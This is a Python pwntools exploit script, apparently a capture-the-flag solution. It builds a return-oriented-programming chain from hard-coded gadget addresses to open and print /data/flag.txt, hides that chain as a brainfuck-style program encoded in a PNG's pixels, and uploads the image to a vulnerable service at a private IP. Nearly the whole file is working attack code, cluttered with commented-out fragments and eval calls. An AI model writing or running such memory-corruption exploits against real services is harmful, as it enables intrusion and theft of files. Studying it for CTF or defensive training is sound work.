#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfinit

import os
import time
import pwn
from PIL import Image
from create_image import *
from time import sleep
import requests
import sys


# Set up pwntools for the correct architecture
exe  = pwn.context.binary = pwn.ELF('./patched')
pwn.context.terminal = ["tilix","-a","session-add-right","-e"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([ "strace", exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([ "strace", exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x401FEB
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def GetOffsetStdin():
    log_level = pwn.context.log_level
    pwn.context.log_level = 'critical'
    p = pwn.process(exe.path)
    p.sendline(pwn.cyclic(512))
    p.wait()
    time.sleep(2)
    core = p.corefile
    fault = core.fault_addr
    ofst = pwn.cyclic_find(fault & 0xffffffff)
    p.close()
    pwn.context.log_level = log_level
    return ofst


def GetOffsetArgv():
    log_level = pwn.context.log_level
    pwn.context.log_level = 'critical'
    p = pwn.process([exe.path, cyclic(512)])
    p.wait()
    time.sleep(2)
    core = p.corefile
    fault = core.fault_addr
    ofst = pwn.cyclic_find(fault & 0xffffffff)
    p.close()
    pwn.context.log_level = log_level
    return ofst


def write(off, data):
    bf = ""
    da = b""

    bf += ">" * off
    for b in data:
        if b == 0 or b == ord('"'):
            bf += ",->" # write 1 and then decrement it
            da += pwn.p8(b+1)
        elif b == 10 or b == 18 or b == 0x20:
            bf += ",---------->"
            da += pwn.p8(b+10)
        else:
            bf += ",>"
            da += pwn.p8(b)
    return bf, da

def send_expl(image_path, code):
    url = "http://192.168.0.101:6969/"
    file = {'file': open(image_path,'rb')}
    payload = { "text" : code}
    r = requests.post(url, files=file, data=payload, allow_redirects=True)
    print(r.text)
    print(r)
    print(r.history)
    for response in r.history:
        print(response.url)



ROP_START = 0x4e4340
SYSCALL = 0x426194
POP_RAX = 0x45cd07
POP_RDI = 0x4018da
POP_RSI = 0x402a38 
POP_RDX = 0x4017df
POP_RCX = 0x42815b
POP_RBX = 0x402242
POP_RBP = 0x00000000401d61
LEAVE_RET = 0x00000000401e88
RET = 0x0000000040101a
BSS = 0x4e3300
MOV_RDI_RAX = 0x0000000041e163
mov_r13_rax = 0x00000000470478 # 0x00000000470478: mov r13, rax; mov rdi, r12; call rbx; 
mov_rdi_r13 = 0x000000004704b6
mov_rdi_rdx_ret = 0x00000000442f23
def call_read():
    rop = b""
    rop += pwn.p64(POP_RDI)
    rop += pwn.p64(0x0)
    rop += pwn.p64(POP_RSI)
    rop += pwn.p64(0x4e4340)
    rop += pwn.p64(POP_RDX)
    rop += pwn.p64(0x1337)
    rop += pwn.p64(SYSCALL)
    rop += pwn.p64(0x00000000402487)
    rop += pwn.p64(0x4e4340)
    rop += pwn.p64(LEAVE_RET)
    return rop

import struct

def rawbytes(s):
    """Convert a string to raw bytes without encoding"""
    outlist = []
    for cp in s:
        num = ord(cp)
        if num < 255:
            outlist.append(struct.pack('B', num))
        elif num < 65535:
            outlist.append(struct.pack('>H', num))
        else:
            b = (num & 0xFF0000) >> 16
            H = num & 0xFFFF
            outlist.append(struct.pack('>bH', b, H))
    return b''.join(outlist)

# mprotect(0x4e2000, 0x1000, 7)
payload = b''
# payload += b'\x01\x02\x03\x04\x05\x06'
# payload += pwn.p64(0xdeadbeef)
payload += pwn.p64(POP_RDI)
payload += pwn.p64(BSS)
payload += pwn.p64(POP_RDX)
payload += b"/data/fl"
payload += pwn.p64(mov_rdi_rdx_ret)
payload += pwn.p64(POP_RDI)
payload += pwn.p64(BSS+8)
payload += pwn.p64(POP_RDX)
payload += b"ag.txt\x00\x00"
payload += pwn.p64(mov_rdi_rdx_ret)
payload += pwn.p64(0x0000000049e984) # mov eax 2 ret
payload += pwn.p64(POP_RDI)
payload += pwn.p64(BSS)
payload += pwn.p64(POP_RSI)
payload += pwn.p64(0x0)
payload += pwn.p64(POP_RDX)
payload += pwn.p64(0x0)
payload += pwn.p64(SYSCALL) # open /data/flag.txt
# payload += pwn.p64(POP_RDI)
# payload += pwn.p64(2)
# payload += pwn.p64(POP_RSI)
# payload += pwn.p64(BSS+0x69)
# payload += pwn.p64(0x000000004571a0) # xor rax rax
payload += pwn.p64(POP_RDX)
payload += pwn.p64(0x1337)
# payload += pwn.p64(SYSCALL) # read /data/flag.txt
payload += pwn.p64(POP_RDI)
payload += pwn.p64(0x1)
payload += pwn.p64(POP_RSI)
payload += pwn.p64(BSS)
payload += pwn.p64(0x0000000045c150) # mov eax 1 syscall
payload += pwn.p64(0x41ede0) # exit
rop = b""
rop += pwn.p64(0xdeadbeef)
rop += payload
bf, da = write(120, rop)

args = [
    '"%s"' % bf,
    da
]
pixels = make_pixels(bf)
pixels = eval("[" + pixels + "]")
image_path=make_image(pixels, path="/home/init0/exit.png")
# print(image_path)\
# f="\xef\xbe\xad\xde\x01\x01\x01\x01\xda\x18@\x01\x01\x01\x01\x01\x013N\x01\x01\x01\x01\x01\xdf\x17@\x01\x01\x01\x01\x01/data/fl#/D\x01\x01\x01\x01\x01\xda\x18@\x01\x01\x01\x01\x01\x083N\x01\x01\x01\x01\x01\xdf\x17@\x01\x01\x01\x01\x01ag.txt\x01\x01#/D\x01\x01\x01\x01\x01\x84\xe9I\x01\x01\x01\x01\x01\xda\x18@\x01\x01\x01\x01\x01\x013N\x01\x01\x01\x01\x018*@\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\xdf\x17@\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x94aB\x01\x01\x01\x01\x01\xdf\x17@\x01\x01\x01\x01\x017\x13\x01\x01\x01\x01\x01\x01\xda\x18@\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x018*@\x01\x01\x01\x01\x01\x013N\x01\x01\x01\x01\x01P\xc1E\x01\x01\x01\x01\x01\xe0\xedA\x01\x01\x01\x01\x01"
# kek = b"\xef\xbe\xad\xde\x01\x01\x01\x01\xda\x18@\x01\x01\x01\x01\x01\x013N\x01\x01\x01\x01\x01\xdf\x17@\x01\x01\x01\x01\x01/data/fl#/D\x01\x01\x01\x01\x01\xda\x18@\x01\x01\x01\x01\x01\x083N\x01\x01\x01\x01\x01\xdf\x17@\x01\x01\x01\x01\x01ag.txt\x01\x01#/D\x01\x01\x01\x01\x01\x84\xe9I\x01\x01\x01\x01\x01\xda\x18@\x01\x01\x01\x01\x01\x013N\x01\x01\x01\x01\x018*@\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\xdf\x17@\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x94aB\x01\x01\x01\x01\x01\xdf\x17@\x01\x01\x01\x01\x017\x13\x01\x01\x01\x01\x01\x01\xda\x18@\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x018*@\x01\x01\x01\x01\x01\x013N\x01\x01\x01\x01\x01P\xc1E\x01\x01\x01\x01\x01\xe0\xedA\x01\x01\x01\x01\x01"
# print(da.decode('unicode-escape').encode('latin1'))
# print(kek)
# print(da == kek)
import binascii
print(da)
kek = "r" + str(da)[1:]
meme = (eval(kek))
# print(binascii.hexlify(da, b'\/x'))
fuck = b""
# import binascii
# for l in da:
    # print(hex(chr(l)))
    # fuck += f"\x{binascii.hexlify(l)}"
# print(fuck)
llll = open("expl.dat", "rb").read()
tet = "b'" + ''.join(f'\\x{c:02x}' for c in da) + "'"

fuck=fuck.decode('unicode-escape').encode('latin1').decode('utf-8')
# llll = llll.encode('latin1')
print("meme")
print(meme)
if image_path:
    print("success")
    # send_expl(image_path, kek.decode('latin-1').encode('utf-8'))
    # fuck = eval("b'" + f.encode('unicode-escape') + "'")
    send_expl(image_path, meme)

# io = start(argv=args)
# io.interactive()